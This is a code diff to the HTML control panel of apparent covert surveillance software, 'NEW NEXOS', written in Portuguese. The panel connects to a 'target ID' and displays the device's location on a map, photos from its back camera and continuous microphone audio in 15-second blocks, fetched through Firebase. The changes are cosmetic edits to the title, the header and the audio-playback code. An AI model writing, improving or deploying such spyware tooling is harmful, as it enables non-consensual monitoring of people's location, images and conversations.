@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> NEW NEXOS // PAINEL DE MONITORAMENTO</title>
+    <title>NEW NEXOS // PAINEL DE MONITORAMENTO</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
@@ -45,7 +45,7 @@
 </head>
 <body>
     <div class="wrapper">
-        <div class="header"><h1>NEXOS // PAINEL DE MONITORAMENTO</h1></div>
+        <div class="header"><h1>NEW NEXOS // PAINEL DE MONITORAMENTO</h1></div>
         <div class="search-box">
             <p>DIGITE O TARGET ID PARA CONECTAR</p>
             <input type="text" id="targetId" placeholder="EX: NX-A4B7D1" required><br>
@@ -134,18 +134,18 @@
                         document.getElementById('imgBack').src = 'data:image/jpeg;base64,' + data.photo_back;
                         document.getElementById('imgBack').style.display = 'block';
                     }
+                    // 🎤 Áudio contínuo (15 segundos por bloco)
                     if (data.audio && data.audio.length > 100) {
-    const audioPlayer = document.getElementById('audioPlayer');
-    const newSrc = 'data:audio/wav;base64,' + data.audio;
-    // Só troca se for um áudio NOVO
-    if (audioPlayer.src !== newSrc) {
-        const wasPlaying = !audioPlayer.paused;
-        audioPlayer.src = newSrc;
-        if (wasPlaying) {
-            audioPlayer.play().catch(() => {});
-        }
-    }
-}
+                        const audioPlayer = document.getElementById('audioPlayer');
+                        const newSrc = 'data:audio/wav;base64,' + data.audio;
+                        if (audioPlayer.src !== newSrc) {
+                            const wasPlaying = !audioPlayer.paused;
+                            audioPlayer.src = newSrc;
+                            if (wasPlaying) {
+                                audioPlayer.play().catch(() => {});
+                            }
+                        }
+                    }
                 } else {
                     document.getElementById('errorBox').style.display = 'block';
                     document.getElementById('deviceSection').style.display = 'none';
